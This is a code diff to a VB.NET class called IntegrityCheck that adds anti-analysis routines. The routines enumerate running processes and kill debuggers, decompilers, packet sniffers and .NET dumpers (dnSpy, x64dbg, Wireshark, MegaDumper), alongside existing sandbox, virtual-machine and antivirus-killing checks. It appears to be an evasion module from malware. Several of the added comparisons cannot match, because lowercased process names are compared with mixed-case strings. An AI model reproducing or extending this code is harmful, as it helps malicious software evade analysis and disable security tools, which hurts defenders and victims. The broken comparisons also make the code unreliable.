@@ -19,6 +19,11 @@ Public Class IntegrityCheck
         AntiNetStat()
         AntiNetworkMiner()
         AntiTcpview()
+        AntiDNSpy()
+        Antix64dbg()
+        AntiWireshark()
+        AntiNetTracer()
+        AntiNetDump()
     End Sub
 
     Sub ProcKill()
@@ -34,7 +39,7 @@ Public Class IntegrityCheck
         End If
         Exit Function
 error1:
-        Process.GetCurrentProcess.Kill()
+        ProcKill()
     End Function
     Public Function antiSandboxie() As Boolean
         On Error GoTo error1
@@ -45,7 +50,7 @@ error1:
         End If
         Exit Function
 error1:
-        Process.GetCurrentProcess.Kill()
+        ProcKill()
     End Function
 
     Public Function antiAnubis() As Boolean
@@ -59,7 +64,7 @@ error1:
         End If
         Exit Function
 error1:
-        Process.GetCurrentProcess.Kill()
+        ProcKill()
     End Function
 
     Public Function AntiVirtualBox() As Boolean
@@ -74,7 +79,7 @@ error1:
         End Select
         Exit Function
 error1:
-        Process.GetCurrentProcess.Kill()
+        ProcKill()
     End Function
 
     Public Function AntiVmWare() As Boolean
@@ -89,7 +94,7 @@ error1:
         End Select
         Exit Function
 error1:
-        Process.GetCurrentProcess.Kill()
+        ProcKill()
     End Function
 
     Public Function AntiVirtualPC() As Boolean
@@ -104,7 +109,7 @@ error1:
         End Select
         Exit Function
 error1:
-        Process.GetCurrentProcess.Kill()
+        ProcKill()
     End Function
     Sub AntiBitDefender()
         Dim generaldee As Process() = Process.GetProcesses
@@ -244,6 +249,64 @@ error1:
         For i = 0 To generaldee.Length - 1
             Select Case Strings.LCase(generaldee(i).ProcessName)
                 Case "ollydbg"
+                    generaldee(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+
+    Sub AntiNetDump()
+        Dim generaldee As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To generaldee.Length - 1
+            Select Case Strings.LCase(generaldee(i).ProcessName)
+                Case "KDD"
+                    generaldee(i).Kill()
+                Case "NETUnpack"
+                    generaldee(i).Kill()
+                Case "Dotnet_Dumper"
+                    generaldee(i).Kill()
+                Case "MegaDumper"
+                    generaldee(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiNetTracer()
+        Dim generaldee As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To generaldee.Length - 1
+            Select Case Strings.LCase(generaldee(i).ProcessName)
+                Case "KDT"
+                    generaldee(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub Antix64dbg()
+        Dim generaldee As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To generaldee.Length - 1
+            Select Case Strings.LCase(generaldee(i).ProcessName)
+                Case "x64dbg"
+                    generaldee(i).Kill()
+                Case "x32_dbg"
+                    generaldee(i).Kill()
+                Case "x64_dbg"
+                    generaldee(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+
+    Sub AntiDNSpy()
+        Dim generaldee As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To generaldee.Length - 1
+            Select Case Strings.LCase(generaldee(i).ProcessName)
+                Case "dnSpy-x86"
+                    generaldee(i).Kill()
+                Case "dnSpy"
                     generaldee(i).Kill()
                 Case Else
             End Select
